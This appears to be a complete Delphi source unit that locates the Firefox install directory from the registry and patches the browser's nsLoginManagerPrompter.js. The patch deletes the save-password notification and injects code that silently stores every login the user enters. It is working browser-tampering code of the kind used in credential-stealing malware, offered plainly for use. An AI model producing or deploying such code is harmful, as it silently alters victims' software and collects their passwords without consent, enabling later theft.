unit uSaveFirefoxPasswords;

interface

uses Windows, Sysutils, Classes;

function AutoSavePasswords : Boolean;

implementation

function ReadKeyToString(hRoot : HKEY; sKey : PChar; sSubKey : PChar) : String;
var
  hOpen : HKEY;
  sBuff : array[0..255] of Char;
  dSize : integer;
begin
  Result := '';
  if (RegOpenKeyEx(hRoot, sKey, 0, KEY_QUERY_VALUE, hOpen) = ERROR_SUCCESS) then
    begin
    dSize := SizeOf(sBuff);
    RegQueryValueEx(hOpen, sSubKey, nil, nil, @sBuff, @dSize);
    Result := sBuff;
    end;
  RegCloseKey(hOpen);
end;

function GetFirefoxDir : String;
var
  FirefoxVersion : String;
  FirefoxPath    : String;
begin
  Result := '';
  FirefoxVersion := ReadKeyToString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Mozilla\Mozilla Firefox\', 'CurrentVersion');
  if Length(FirefoxVersion) > 0 then begin
    FirefoxPath :=  ReadKeyToString(HKEY_LOCAL_MACHINE, PChar('SOFTWARE\Mozilla\Mozilla Firefox\' + FirefoxVersion + '\Main'), 'Install Directory');
    if Length(FirefoxPath) > 0 then Result := FirefoxPath + '\';
  end;
end;

function LoadFile(const FileName : TFileName): string;
begin
  with TFileStream.Create(FileName,
      fmOpenRead or fmShareDenyWrite) do begin
    try
      SetLength(Result, Size);
      Read(Pointer(Result)^, Size);
    except
      Result := '';
      Free;
      raise;
    end;
    Free;
  end;
end;

procedure SaveFile(const FileName: TFileName;
                   const Content: string);
begin
  with TFileStream.Create(FileName, fmCreate) do
    try
      Write(Pointer(content)^, Length(content));
    finally
      Free;
    end;
end;

function AutoSavePasswords : Boolean;
const
//File Delimiters
  First_Line = '_showSaveLoginNotification : function (aNotifyBox, aLogin) {';
  End_Line   = 'this._showLoginNotification(aNotifyBox, "password-save",' + #10 + '             notificationText, buttons);';
//Data To Add
  Data_To_Add = 'var pwmgr = this._pwmgr;' + #13#10 +
                'pwmgr.addLogin(aLogin);';
var
  fileString : String;
  modString  : String;
  firstDelimeter, lastDelimeter : Integer;
begin
  Result := False;
//Find and open up the target file
//Load the file into a string
  fileString := LoadFile(GetFirefoxDir + 'components\nsLoginManagerPrompter.js');
//Find the delimeters in the 'fileString'
  firstDelimeter := Pos(First_Line, fileString);
  lastDelimeter  := Pos(End_Line, fileString);
//Check they are valid
  if (firstDelimeter > 0) and (lastDelimeter > 0) then begin
  //Carve that section out
    Delete(fileString, firstDelimeter + Length(First_Line), lastDelimeter - (firstDelimeter + Length(First_Line)) + Length(End_Line));
  //Add our data in
    modString := Copy(fileString, 1, firstDelimeter + Length(First_Line) - 1) + #13#10 + Data_To_Add + Copy(fileString, firstDelimeter + Length(First_Line), Length(fileString) - (firstDelimeter + Length(First_Line) - 1)) + #13#10 ;
    SaveFile(GetFirefoxDir + 'components\nsLoginManagerPrompter.js', modString);
    Result := True;
  end;
end;

end. 